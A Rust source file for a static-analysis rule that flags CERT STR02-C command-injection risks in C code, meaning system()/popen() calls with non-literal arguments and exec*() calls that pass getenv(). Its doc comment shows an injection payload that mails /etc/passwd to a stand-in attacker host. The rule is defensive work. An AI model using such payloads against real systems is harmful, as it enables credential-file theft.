//! STR02-C: Sanitize data passed to complex subsystems
//!
//! This rule detects when string data is passed to complex subsystems (command
//! processors, databases, external programs) without proper sanitization, which
//! can lead to injection vulnerabilities.
//!
//! ## Non-compliant example:
//!
//! ```c
//! char buffer[512];
//! sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
//! system(buffer);  // User-controlled addr can inject commands
//!
//! // Attacker provides: bogus@addr.com; cat /etc/passwd | mail attacker@evil.com
//! ```
//!
//! ## Compliant solution:
//!
//! ```c
//! // Use execl() instead of system() to avoid shell interpretation
//! execl("/bin/mail", "mail", addr, (char *)NULL);
//!
//! // Or whitelist acceptable characters
//! if (strspn(addr, "abcdefghijklmnopqrstuvwxyz@.-_") != strlen(addr)) {
//!     // Invalid characters detected
//!     return ERROR;
//! }
//! system(buffer);
//! ```

use super::super::{CertRule, RuleViolation};
use crate::manifest::{RuleCategory, Severity};
use crate::utility::cert_c::ast_utils::get_node_text;
use tree_sitter::Node;

pub struct Str02C;

impl Str02C {
    pub fn new() -> Self {
        Self
    }

    /// Check for calls to dangerous functions with potentially unsanitized arguments
    fn check_dangerous_function_call(
        &self,
        node: &Node,
        source: &str,
        violations: &mut Vec<RuleViolation>,
    ) {
        if node.kind() != "call_expression" {
            return;
        }

        if let Some(function_node) = node.child_by_field_name("function") {
            let function_name = get_node_text(&function_node, source);

            match &function_name[..] {
                "system" | "popen" => {
                    self.check_command_injection_risk(node, source, &function_name, violations);
                }
                "execl" | "execle" | "execlp" | "execv" | "execvp" | "execve" => {
                    self.check_exec_family_call(node, source, &function_name, violations);
                }
                _ => {}
            }
        }
    }

    /// Check system() and popen() calls for command injection risk
    fn check_command_injection_risk(
        &self,
        node: &Node,
        source: &str,
        function_name: &str,
        violations: &mut Vec<RuleViolation>,
    ) {
        if let Some(args_node) = node.child_by_field_name("arguments") {
            // Get first argument
            if let Some(first_arg) = self.get_first_argument(&args_node) {
                let arg_text = get_node_text(&first_arg, source);

                // Check if argument is a string literal (safe) or a variable/expression (risky)
                if !self.is_string_literal(&first_arg) {
                    violations.push(RuleViolation {
                        rule_id: self.rule_id().to_string(),
                        severity: self.severity(),
                        message: format!(
                            "Call to {}() with non-literal argument '{}' detected. This may allow command injection if the string contains unsanitized user input or environment variables.",
                            function_name, arg_text.trim()
                        ),
                        file_path: String::new(),
                        line: node.start_position().row + 1,
                        column: node.start_position().column + 1,
                        suggestion: Some(
                            format!(
                                "Sanitize the string argument before passing to {}() by whitelisting acceptable characters, or use exec*() functions instead of system() to avoid shell interpretation.",
                                function_name
                            )
                        ),
                        ..Default::default()
                    });
                }
            }
        }
    }

    /// Check exec*() family calls for command injection risk
    /// exec*() is generally safer than system() because it doesn't invoke the shell
    /// We only flag exec*() when user data is passed in arguments without proper protection
    fn check_exec_family_call(
        &self,
        node: &Node,
        source: &str,
        function_name: &str,
        violations: &mut Vec<RuleViolation>,
    ) {
        if let Some(args_node) = node.child_by_field_name("arguments") {
            // For exec*() functions, we look for getenv() calls in arguments
            // which indicate potentially unsanitized user/environment data
            let args_text = get_node_text(&args_node, source);

            // Check if getenv() is used in arguments without protection
            // getenv returns environment variables which may be user-controlled
            if args_text.contains("getenv(") {
                // Check if "--" appears BEFORE getenv() in the arguments
                // The "--" argument signals "end of options" to prevent option injection
                if let Some(getenv_pos) = args_text.find("getenv(") {
                    let before_getenv = &args_text[..getenv_pos];
                    // If "--" appears before getenv, the user data cannot be interpreted
                    // as command-line options, which is the proper protection
                    if before_getenv.contains("\"--\"") {
                        return; // Properly protected with end-of-options marker
                    }
                }

                // Check if there's any indication of sanitization in the containing scope
                let scope = self.find_containing_scope(node);
                if let Some(scope) = scope {
                    let scope_text = get_node_text(&scope, source);
                    // If strspn or similar sanitization is present, it's likely safe
                    if scope_text.contains("strspn(")
                        || scope_text.contains("strcspn(")
                        || scope_text.contains("ok_chars")
                    {
                        return; // Likely sanitized
                    }
                }

                violations.push(RuleViolation {
                    rule_id: self.rule_id().to_string(),
                    severity: Severity::Medium,
                    message: format!(
                        "Call to {}() with getenv() in arguments without '--' end-of-options marker. Environment variables may contain values that could be interpreted as command options.",
                        function_name
                    ),
                    file_path: String::new(),
                    line: node.start_position().row + 1,
                    column: node.start_position().column + 1,
                    suggestion: Some(
                        "Add '--' argument before user-controlled data to prevent option injection, or sanitize the data before passing to exec*() functions."
                            .to_string(),
                    ),
                    ..Default::default()
                });
            }
        }
    }

    /// Find the containing function or scope for a node
    fn find_containing_scope<'a>(&self, node: &Node<'a>) -> Option<Node<'a>> {
        let mut current = *node;
        while let Some(parent) = current.parent() {
            if parent.kind() == "function_definition"
                || parent.kind() == "compound_statement"
                || parent.kind() == "translation_unit"
            {
                return Some(parent);
            }
            current = parent;
        }
        None
    }

    /// Get the first argument from an argument list node
    fn get_first_argument<'a>(&self, args_node: &Node<'a>) -> Option<Node<'a>> {
        for i in 0..args_node.child_count() {
            if let Some(child) = args_node.child(i) {
                // Skip '(' and ')' and ',' tokens
                if child.kind() != "(" && child.kind() != ")" && child.kind() != "," {
                    return Some(child);
                }
            }
        }
        None
    }

    /// Check if a node represents a string literal
    fn is_string_literal(&self, node: &Node) -> bool {
        node.kind() == "string_literal" || node.kind() == "concatenated_string"
    }
}

impl CertRule for Str02C {
    fn rule_id(&self) -> &'static str {
        "STR02-C"
    }

    fn description(&self) -> &'static str {
        "Sanitize data passed to complex subsystems"
    }

    fn severity(&self) -> Severity {
        Severity::High
    }

    fn category(&self) -> RuleCategory {
        RuleCategory::Rule
    }

    fn cert_id(&self) -> &'static str {
        "STR02-C"
    }

    fn check(&self, node: &Node, source: &str) -> Vec<RuleViolation> {
        let mut violations = Vec::new();
        self.check_node(node, source, &mut violations);
        violations
    }
}

impl Str02C {
    fn check_node(&self, node: &Node, source: &str, violations: &mut Vec<RuleViolation>) {
        // Check for dangerous function calls
        self.check_dangerous_function_call(node, source, violations);

        // Recursively check child nodes
        for i in 0..node.child_count() {
            if let Some(child) = node.child(i) {
                self.check_node(&child, source, violations);
            }
        }
    }
}
